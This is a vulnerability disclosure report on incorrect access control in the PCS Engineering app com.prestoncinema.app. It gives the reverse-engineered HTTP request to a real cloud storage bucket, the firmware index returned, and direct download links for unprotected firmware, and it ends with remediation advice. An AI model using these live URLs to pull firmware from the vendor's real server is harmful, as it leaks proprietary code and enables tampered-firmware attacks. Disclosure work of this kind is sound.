# Vulnerability Report - com.prestoncinema.app- Incorrect Access Control

**Product:** `com.prestoncinema.app` 

**Vendor:** [PCS Engineering](http://www.pcsengineering.net/)

**Version:** 0.2.0

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.prestoncinema.app` , developed by **PCS Engineering**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `pcsPath` Field value in the `FirmwareUpdateActivity` class provides the necessary URL and other information required for the HTTPS request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003203521013](https://s2.loli.net/2024/10/03/rbqohPnLJmlRsKc.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://storage.googleapis.com/preston-42629.appspot.com/firmware_app/firmware.xml HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: storage.googleapis.com
   Content-Length: 0
   Content-Type: text/plain
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   x-goog-generation: 1725378482750814
   x-goog-metageneration: 1
   x-goog-stored-content-encoding: identity
   x-goog-stored-content-length: 89349
   x-goog-hash: crc32c=zGH6qw==
   x-goog-hash: md5=Jdt9ClEathvV8ArK2ClOhw==
   x-goog-storage-class: STANDARD
   Accept-Ranges: bytes
   Content-Length: 89349
   X-GUploader-UploadID: AD-8ljvKuO6d4hAJ5kV1TXi3nWRkNyq-Gzc6PGrVUFyy0cyksT_3BuATE-uMOrb-KFI8iaWxsaU
   Server: UploadServer
   Date: Thu, 03 Oct 2024 12:35:56 GMT
   Expires: Fri, 03 Oct 2025 12:35:56 GMT
   Cache-Control: no-cache
   Last-Modified: Tue, 03 Sep 2024 15:48:02 GMT
   ETag: "25db7d0a511ab61bd5f00acad8294e87"
   Content-Type: text/xml
   Age: 0
   Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
   
   <?xml version="1.0"?>
   <prestoncinema>
     <products>
       <product name="Hand3">
         <firmware>
           <firmwarerelease version="2.60" hexfile="https://storage.googleapis.com/preston-42629.appspot.com/firmware_app/Hand3_260Out.S19" latest="true">
             <change>MDR5 support</change>
             <change>Bug Fixes and Improvements</change>
           </firmwarerelease>
           <firmwarerelease version="2.57" hexfile="https://storage.googleapis.com/preston-42629.appspot.com/firmware_app/Hand3_257Out.S19" latest="false">
             <change>Bug Fixes and Improvements</change>
           </firmwarerelease>
           <firmwarerelease version="2.56" hexfile="https://storage.googleapis.com/preston-42629.appspot.com/firmware_app/Hand3_256Out.S19" latest="false">
    ......
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003203849251](https://s2.loli.net/2024/10/03/q1ctw7KVdES5QiM.png)
   
   In total, we successfully downloaded **88 firmware** by exploiting the vulnerability.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.